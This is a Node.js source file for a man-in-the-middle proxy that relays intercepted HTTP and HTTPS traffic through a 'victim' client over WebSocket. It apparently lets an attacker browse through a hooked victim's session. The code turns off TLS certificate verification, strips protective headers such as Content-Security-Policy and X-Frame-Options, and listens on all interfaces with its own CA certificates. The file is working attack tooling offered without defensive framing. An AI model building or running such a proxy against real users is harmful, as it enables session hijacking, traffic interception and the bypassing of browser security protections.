const HttpMitmProxy = require('http-mitm-proxy');
const { startServer: startVictimServer, sendWebSocketRequest } = require('./victimServer');
const axios = require('axios');
const e = require('express');


process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

blockedHeaders = [
  'x-content-type-option',
  'content-security-policy',
  'x-frame-options',
  'x-xss-protection',
  'content-encoding',
]

function cleanHTML(html) {
  return html.replace(/\n/g, '').replace(/\r/g, '').replace(/\t/g, '').replace(/\s{2,}/g, ' ');
}

function filterHeaders(headers) {
  const filteredHeaders = {};
  for (const key in headers) {
    if (!blockedHeaders.includes(key.toLowerCase())) {
      filteredHeaders[key] = headers[key];
    }
  }
  return filteredHeaders;
}

function startProxyServer() {
  const proxy = new HttpMitmProxy.Proxy();

  proxy.onRequest(async (ctx, callback) => {
    const protocol = ctx.isSSL ? 'https://' : 'http://';
    const host = ctx.clientToProxyRequest.headers.host;
    const port = ctx.proxyToServerRequestOptions.port;
    const url = ctx.clientToProxyRequest.url;
  
    const fullUrl = `${protocol}${host}:${port}${url}`;
  
    console.log(`[${new Date().toISOString()}] ${ctx.clientToProxyRequest.method} ${fullUrl}`);
  
    
    const wsId = ctx.clientToProxyRequest.headers.shve;
    const headers = ctx.clientToProxyRequest.headers;
  
    const response = await sendWebSocketRequest(wsId, ctx.clientToProxyRequest.method, fullUrl, headers, ctx.clientToProxyRequest.postData);
    if (response.error) {
      try {
        const proxyResponse = await axios({
          method: ctx.clientToProxyRequest.method,
          url: fullUrl,
          headers: headers,
          data: ctx.clientToProxyRequest.postData
        });
    
        if (!proxyResponse.headers['content-type'].startsWith('text/html')) {
          ctx.proxyToClientResponse.writeHead(proxyResponse.status, filterHeaders(proxyResponse.headers));
          ctx.proxyToClientResponse.end(proxyResponse.data);
        } else {
          ctx.proxyToClientResponse.writeHead(200, { 'Content-Type': 'text/plain' });
          ctx.proxyToClientResponse.end(response.error);
        }
      } catch (error) {
        ctx.proxyToClientResponse.writeHead(200, { 'Content-Type': 'text/plain' });
        ctx.proxyToClientResponse.end(response.error);
      }
    } else {
      const filteredHeaders = filterHeaders(response.headers);
      let filteredHtml;
      try{
        if (response.headers['content-type'] && response.headers['content-type'].toLowerCase().startsWith('text/html')) {
          filteredHtml = cleanHTML(response.data);
        } else{
          filteredHtml = response.data;
        }
        ctx.proxyToClientResponse.writeHead(response.status_code, filteredHeaders);
        ctx.proxyToClientResponse.end(filteredHtml);
      }
      catch (e){
        console.log(response.headers)
      }
    }
    return callback();
  });

  proxy.listen({ host: '0.0.0.0', port: 8081, sslCaDir: './certs' }, () => {
    console.log('Proxy listening on port: 8081');
  });
}

module.exports = startProxyServer;